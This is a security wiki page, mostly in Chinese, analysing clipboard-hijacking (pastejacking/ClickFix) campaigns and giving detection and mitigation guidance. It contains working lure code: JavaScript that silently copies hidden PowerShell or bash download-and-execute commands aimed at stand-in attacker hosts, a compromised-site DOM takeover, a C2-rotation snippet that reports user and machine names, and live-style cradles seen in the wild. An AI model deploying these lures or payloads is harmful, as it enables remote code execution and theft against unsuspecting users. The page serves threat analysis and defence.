# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – 利用用户经常在不检查内容的情况下复制并粘贴命令这一事实。恶意网页（或任何支持 JavaScript 的上下文，例如 Electron 或 Desktop application）会以编程方式将攻击者控制的文本放入系统 clipboard。通常通过精心设计的 social-engineering 指令，诱使受害者按下 **Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell），或者打开 terminal 并 *paste* clipboard 内容，从而立即执行任意命令。

由于**不会下载文件，也不会打开附件**，这种技术绕过了大多数监控附件、macros 或直接命令执行的 e-mail 和 web-content 安全控制。因此，这种攻击在投递常见 malware 家族的 phishing campaigns 中很流行，例如 NetSupport RAT、Latrodectus loader 或 Lumma Stealer。

## Wallet-address replacement clippers

另一种 **clipboard hijacking** 变体并不会粘贴命令：它会等待受害者复制一个 **cryptocurrency wallet address**，然后在粘贴前悄悄将其替换为攻击者控制的地址。这对较长的 wallet 格式尤其有效，因为用户通常只会验证开头和结尾几个字符。

常见的真实环境特征：
- **Thin loader + nested payload**：可见的 app/exe 看起来像一个合法的交易或“profit”工具，而真正的 clipper 隐藏在 bundle 更深处（例如一个 .NET loader 启动嵌套的 Rust payload）。
- **Regex-driven replacement**：malware 匹配如 `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`，甚至通用的 **44-character Solana-like** 字符串，并将它们重写为攻击者 wallet。
- **Wallet rotation at scale**：现代 Windows 样本可能为每种货币嵌入**数千**个替换 wallet，而不是单一静态地址，从而在每次盗取后降低 wallet reputation burn。

### Windows clipper flow

一种常见实现是注册一个隐藏窗口并使用 **`AddClipboardFormatListener`**。每次 clipboard 更新时，malware 通常调用：
- **`OpenClipboard`** → 访问当前 clipboard 数据。
- **`GetClipboardData`** → 读取文本。
- **`EmptyClipboard`** + **`SetClipboardData`** → 将 wallet 字符串替换为攻击者的值。

常见于 clippers 中的最小 hunting regex：
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
用户级 persistence 已足够造成影响。一个观察到的模式是：
- 将 payload 复制到 **`%APPDATA%\silke\silke.exe`**
- 在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 下创建一个 **Startup-folder LNK**

检测思路：
- 持续调用 clipboard APIs，同时还在 `%APPDATA%` 和用户 **Startup** 目录下写入文件的进程。
- 新的 LNK/executable 创建，随后出现 wallet-address clipboard 重写。
- 包含大量未使用文件的 archives 或 fake-software bundles，以及一个启动嵌套 binary 的小型 launcher。

### macOS social-engineered quarantine removal + LaunchAgent persistence

在 macOS 上，一些 campaigns 会捆绑一个 **`unlocker.command`** helper，并指示受害者在 Gatekeeper 提示应用已损坏或来自未识别开发者时，右键 → **Open**。该 script 只是移除 quarantine 并启动附近的 `.app`：
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
这**不是** Gatekeeper exploit；这是一个**社会工程的 quarantine bypass**，利用了 Gatekeeper 的判断依赖于 `com.apple.quarantine` xattr 这一事实。

执行后，clipper 可以通过写入以下内容以当前用户身份持久化：
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – 带有 `RunAtLoad` 和 `KeepAlive` 的 LaunchAgent

一个有用的防御细节是，某些样本实现了一个**自我修复的 watchdog**，会每隔约 30 秒重新写入 LaunchAgent 和 wrapper。 如果你先删除 plist **而不终止正在运行的进程**，malware 可能会立刻重新创建它。安全清理顺序：
1. Kill 活跃的 clipper process。
2. 卸载/删除 LaunchAgent plist。
3. 删除 `~/launch.sh` 和复制的 payload。

### Delivery note: fake reputation as a force multiplier

对于这个家族来说，malware 本身可以保持技术上很简单，而**分发层**承担了主要工作：伪造 GitHub stars/forks、SourceForge reviews/downloads、YouTube 教程评论/views，以及看起来无害的 VirusTotal comments/votes，都被用来让 binary 在执行前显得可信。

## Forced copy buttons and hidden payloads (macOS one-liners)

一些 macOS infostealers 会克隆 installer sites（例如 Homebrew），并**强制使用 “Copy” 按钮**，这样用户就无法只高亮可见文本。clipboard 条目包含预期的 installer command，加上附加的 Base64 payload（例如，`...; echo <b64> | base64 -d | sh`），因此一次粘贴会同时执行两者，而 UI 会隐藏额外的 stage。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
旧版活动使用 `document.execCommand('copy')`，新版则依赖异步 **Clipboard API** (`navigator.clipboard.writeText`)。

## The ClickFix / ClearFake Flow

1. 用户访问一个拼写错误域名或被入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用一个 `unsecuredCopyToClipboard()` 辅助函数，静默地将一个 Base64 编码的 PowerShell one-liner 存入剪贴板。
3. HTML 指令告诉受害者：*“按 **Win + R**，粘贴命令并按 Enter 以解决问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的归档文件（经典 DLL sideloading）。
5. 加载器解密后续阶段，注入 shellcode 并安装持久化（例如 scheduled task）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（合法的 Java WebStart）会在其目录中搜索 `msvcp140.dll`。
* 恶意 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），使用滚动 XOR key `"https://google.com/"` 解密它们，注入最终的 shellcode，并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 内执行 JScript downloader
3. 获取 MSI payload → 将 `libcef.dll` 放在一个已签名应用程序旁边 → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 调用会启动一个隐藏的 PowerShell 脚本，该脚本会检索 `PartyContinued.exe`，提取 `Boat.pst`（CAB），通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，最后运行一个 `.a3x` 脚本，将浏览器凭据 exfiltrates 到 `sumeriavgv.digital`。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix campaigns 会完全跳过文件下载，并指示受害者粘贴一条会通过 WSH 获取并执行 JavaScript 的一行命令，随后进行持久化，并每天轮换 C2。示例观察到的链路：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 在运行时反转被混淆的 URL，以防止随意检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 自我持久化，并根据当前日期选择 C2 —— 从而实现快速 domain rotation。

用于按日期轮换 C2 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常会部署一个 loader，用于建立持久化并拉取一个 RAT（例如 PureHVNC），常见做法是对 TLS 进行 pinning 到硬编码证书，并对流量进行分块。

针对该变体的检测思路
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动项痕迹：位于 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 的 LNK，调用 WScript/CScript 执行位于 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- Registry/RunMRU 和命令行遥测中包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 反复出现的 `powershell -NoProfile -NonInteractive -Command -`，并带有较大的 stdin payload，用于在不使用长命令行的情况下喂入长脚本。
- Scheduled Tasks 随后执行 LOLBins，例如在看起来像 updater 的 task/path（例如 `\GoogleSystem\GoogleUpdater`）下运行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`。

Threat hunting
- 每日轮换的 C2 hostnames 和 URLs，带有 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联 clipboard 写入事件，随后是 Win+R 粘贴，再紧接着 `powershell.exe` 执行。


Blue-teams 可以结合 clipboard、进程创建和 Registry 遥测来精确定位 pastejacking abuse：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保留 **Win + R** 命令历史记录 – 查找异常的 Base64 / 混淆项。
* Security Event ID **4688**（Process Creation），其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 中。
* Event ID **4663**，用于在可疑的 4688 事件之前，检测 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建。
* EDR clipboard sensors（如果存在）– 关联 `Clipboard Write` 之后立刻出现的新 PowerShell 进程。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近的 campaigns 大规模生成伪造的 CDN/browser verification pages（"Just a moment…"，IUAM-style），诱导用户把 clipboard 中的 OS-specific commands 复制到原生 consoles 中。这样就把 execution 从 browser sandbox 中转移出来，并且可跨 Windows 和 macOS 工作。

Builder 生成页面的关键特征
- 通过 `navigator.userAgent` 进行 OS detection 来定制 payload（Windows PowerShell/CMD vs. macOS Terminal）。对不支持的 OS 可选使用诱饵/no-op，以维持假象。
- 在无害的 UI 操作（checkbox/Copy）时自动 clipboard-copy，而可见文本可能与 clipboard 内容不同。
- 阻止 mobile，并提供带步骤说明的 popover：Windows → Win+R→paste→Enter；macOS → open Terminal→paste→Enter。
- 可选的 obfuscation 和单文件 injector，用于用 Tailwind-styled 的 verification UI 覆盖已被 compromise 的站点 DOM（无需新注册 domain）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 初次运行持久化
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`，这样即使终端关闭，执行也会继续，减少可见痕迹。

在已被入侵的网站上进行原地页面接管
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- 专门针对 IUAM-style lures 的检测与狩猎思路
- Web: 将 Clipboard API 绑定到 verification widgets 的页面；显示文本与 clipboard payload 不匹配；`navigator.userAgent` 分支判断；Tailwind + 在可疑上下文中的 single-page replace。
- Windows endpoint: 在浏览器交互后不久出现 `explorer.exe` → `powershell.exe`/`cmd.exe`；从 `%TEMP%` 执行的 batch/MSI installers。
- macOS endpoint: Terminal/iTerm 在浏览器事件附近启动 `bash`/`curl`/`base64 -d` 并带有 `nohup`；terminal 关闭后仍存活的后台任务。
- 关联 `RunMRU` Win+R 历史和 clipboard writes，与后续 console process creation。

另见支持性技术

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake 继续入侵 WordPress sites，并注入 loader JavaScript，串联外部 hosts（Cloudflare Workers、GitHub/jsDelivr），甚至 blockchain “etherhiding” 调用（例如，向 Binance Smart Chain API endpoints 发送 POST，如 `bsc-testnet.drpc[.]org`），以拉取当前 lure logic。最近的 overlays 大量使用 fake CAPTCHAs，指示用户复制/粘贴一行命令（T1204.004），而不是下载任何东西。
- Initial execution 越来越多地交给 signed script hosts/LOLBAS。2026 年 1 月的 chains 将早先的 `mshta` 使用替换为通过 `WScript.exe` 执行的内置 `SyncAppvPublishingServer.vbs`，并传递带有 aliases/wildcards 的 PowerShell-like arguments 以获取远程内容：
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` 已签名，通常由 App-V 使用；与 `WScript.exe` 以及异常参数（`gal`/`gcm` 别名、带通配符的 cmdlets、jsDelivr URLs）组合时，它会成为 ClearFake 的高信号 LOLBAS 阶段。
- 2026 年 2 月的 fake CAPTCHA payloads 又转回了纯 PowerShell download cradles。两个 live examples：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 第一条链是一个内存中的 `iex(irm ...)` grabber；第二条通过 `WinHttp.WinHttpRequest.5.1` 分阶段，写入临时 `.ps1`，然后在隐藏窗口中用 `-ep bypass` 启动。

这些变体的检测/狩猎提示
- 进程链：browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`，或在 clipboard 写入/Win+R 之后立刻出现的 PowerShell cradles。
- 命令行关键词：`SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker 域名，或原始 IP 的 `iex(irm ...)` 模式。
- 网络：从 script hosts/PowerShell 在 web browsing 之后不久，对 CDN worker hosts 或 blockchain RPC endpoints 发起外连。
- 文件/registry：在 `%TEMP%` 下创建临时 `.ps1`，以及包含这些 one-liners 的 RunMRU 条目；拦截/告警签名脚本 LOLBAS（WScript/cscript/mshta）带外部 URL 或混淆 alias 字符串执行的行为。

## 2026年6月 ClickFix 战术：paste telemetry、伪验证注释，以及 LOLBin chaining

最近 Red Canary 的 telemetry 显示，稳定的指示器**不是某一条固定命令**，而是 **user-assisted paste-and-run**、**trusted interpreters/LOLBins**、**obfuscated flags**、**remote retrieval** 和 **immediate execution** 的组合。

### 典型 operator 模式

- **Paste 确认 telemetry**：某些 payload 会在真正的 stage 之前调用 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`。这既确认了 user interaction，又让窗口保持短暂且安静。
- **伪验证注释**：PowerShell one-liners 可能附加诸如 `# Security check ✔️ I'm not a robot Verification ID: 138105` 之类的字符串，这样命令在粘贴到 Run / `cmd.exe` / PowerShell history 后仍然看起来像 CAPTCHA 相关内容。
- **动态 URL 重建**：`iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` 避免在命令行中出现静态 URL，同时仍然执行内存中的下载并执行。
- **伪装安装程序执行**：`"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` 滥用不寻常的大小写和类似 Unicode 的 flag 字符，破坏脆弱检测，同时仍然看起来像 `msiexec.exe`。
- **Caret 转义的 LOLBin 链**：`cmd.exe` 可以用 `^` 转义隐藏关键词（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`），将嵌套 shell 以最小化方式启动，用诸如 `.pdf` 之类的 benign extension 保存攻击者内容，然后通过 `mshta` 执行它。

## 缓解措施

1. Browser 加固 – 禁用 clipboard write-access（`dom.events.asyncClipboard.clipboardItem` 等）或要求 user gesture。
2. Security awareness – 教用户先“手动输入”敏感命令，或先粘贴到文本编辑器里。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control，阻止任意 one-liners。
4. Network controls – 阻止到已知 pastejacking 和 malware C2 域名的 outbound requests。

## 相关技巧

* **Discord Invite Hijacking** 经常在诱导用户进入恶意 server 后，使用相同的 ClickFix 方法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考资料

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
